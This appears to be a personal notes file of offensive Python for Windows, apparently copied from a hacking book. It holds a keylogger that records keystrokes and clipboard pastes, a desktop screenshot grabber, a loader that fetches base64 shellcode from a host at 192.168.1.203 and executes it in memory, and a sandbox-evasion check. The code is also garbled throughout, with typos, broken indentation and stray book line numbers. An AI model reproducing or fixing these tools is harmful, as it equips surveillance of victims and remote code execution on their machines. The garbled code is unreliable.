kylogger
________

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIo

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class keyLogger:
	def __init__(self):
		self.current_window = None

	def get_current_process(self):
		hwnd = windll.user32.getForegroundWindow()
		pid = c_ulong(0)
		windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
		process_id = f'{pid.value}'

		executable = create_string_buffer(512)
		h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
		windll.papsi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

		window_title = create_string_buffer(512)
		windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
			try:
				self.current_window = window_title.value.decode()
			except UnicodeDecodeError as e:
				print(f'{e}: window name unknown')

			print('\n', process_id, executable.value.decode(), self.current_window)

			windll.kernel32.CloseHandle(hwnd)
			windll.kernel32.CloseHandle(h_process)



	def myKeystroke9self, event;
		if event.WindowName != self.current_window:
			self.get_current_process()
		if 32 < event.Ascii < 127:
			print(chr(event.Ascii), end='')
		else:
			if event.Key == 'V':
				win32clipboard.OpenClipboard()
				value = win32clipboard.getCkipboardData()
				win32clipboard.CloseClipboard()
				print(f'[PASTE] - {value}')
			else:
				print(f'{evemt.key')
		return True


def run():
	save_stdout = sys.stdout
	sys.stdout = StringIO()

	kl = KeyLogger()
	hm = pyhook.HookManager()
	hm.KeyDown = kl.mykeystroke
	hm.HookKeyboard()
	while time.thread_time() < TIMEOUT:
		pythoncom.PumpwaitingMessages()

		log = sys.stdout.getvalu()
		sys.stdout = save_stdout
		return log

if __name__ == '__main__':
	print(run())
	print('done.')



------------------------------------

Taking screenshots

import base64
import win32api
import win32con
import win32gui
import win32ui

def ge_dimensions():
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
 	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
 	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 	return (width, height, left, top)

 def screenshot(name='screenshot');
 	hdesktop = win32gui.GetDesktopWindow()
 	width, height, left, top = get_dimesions()

 	desktop_dc = win32gui.GetWindowDC(hdesktop)
 	img_dc = win32ui.CreateDCFromHandle(desktop_dc)
 	mem_dc = img_dc.CreateCompatibleDC()

 	screenshot = win32ui.CreateBitmap()
 	screenshot.createCompatibleBitmap(img_dc, width, height)
 	mem_dc.SelectObject(screenshot)
 	meme_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 	screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

 	mem_dc.DeleteDC()
 	win32gui.DeleteObject(screenshot.GetHandle())

 def run():
 	screenshot()
 	with open('screenshot.bmp') as f:
 	img = f.read()
 	return img

 if __name__ == '__main__':
 	screenshot()


 ------------------------------------

 Pythonic Shellcode Execution

 from urllib import request

 import base64
 import ctypes

 kernel32 = ctypes.windll.kernel32

 def get_code(url):
 	with request.urlopen(url) as response:
 		shellcode = base64.decodebytes(response.read())
 	return shellcode

 def write_memory(buf):
 	length = len(buf)

 	kernel32.virtualAlloc.restype = ctypes.c_void_p
 	kernel32.RtMoveMemory.argtypes = (
 	ctypes.c_void_p,
 	ctypes.c_void_p,
 	ctypes.c_size_t)

 	ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
 	kernel32.RtMoveMemory(ptr, buf, length)
 	return ptr

 def run(shellcode):
 	buffer = ctypes.create_string_buffer(shellcode)

 	ptr = write_memory(buffer)

 	shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
 	shell_func()

 if __name__ == 'main';
 	url = "http://192.168.1.203:8100/shellcode.bin"
 	shellcode = get_code(url)
 	run(shellcode)


 ---------------------------------

 SandBox Detection

 from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api
class LASTINPUTINFO(Structure):
 fields_ = [
 ('cbSize', c_uint),
 ('dwTime', c_ulong)
 ]
def get_last_input():
 struct_lastinputinfo = LASTINPUTINFO()
1 struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
 windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
2 run_time = windll.kernel32.GetTickCount()
 elapsed = run_time - struct_lastinputinfo.dwTime
 print(f"[*] It's been {elapsed} milliseconds since the last event.")
 return elapsed
3 while True:
 get_last_input()
 time.sleep(1)


 class Detector:
 def __init__(self):
 self.double_clicks = 0
 self.keystrokes = 0
 self.mouse_clicks = 0
 def get_key_press(self):
 1 for i in range(0, 0xff):
 2 state = win32api.GetAsyncKeyState(i)
 if state & 0x0001:
 3 if i == 0x1:
 self.mouse_clicks += 1
 return time.time()
 4 elif i > 32 and i < 127:
 self.keystrokes += 1
 return None


 def detect(self):
 previous_timestamp = None
 first_double_click = None
 double_click_threshold = 0.35
 1 max_double_clicks = 10
 max_keystrokes = random.randint(10,25)
 max_mouse_clicks = random.randint(5,25)
 max_input_threshold = 30000
 2 last_input = get_last_input()
 if last_input >= max_input_threshold:
 sys.exit(0)
 detection_complete = False
 while not detection_complete:
 3 keypress_time = self.get_key_press()
 if keypress_time is not None and previous_timestamp is not None:
 4 elapsed = keypress_time - previous_timestamp
 5 if elapsed <= double_click_threshold:
 self.mouse_clicks -= 2
 self.double_clicks += 1
 if first_double_click is None:
 first_double_click = time.time()
 else:
 6 if self.double_clicks >= max_double_clicks:
 7 if (keypress_time - first_double_click <=
 (max_double_clicks*double_click_threshold)):
 sys.exit(0)
 8 if (self.keystrokes >= max_keystrokes and
 self.double_clicks >= max_double_clicks and
 self.mouse_clicks >= max_mouse_clicks):
 detection_complete = True
 previous_timestamp = keypress_time
 elif keypress_time is not None:
 previous_timestamp = keypress_time

 if __name__ == '__main__':
 d = Detector()
 d.detect()
 print('okay.')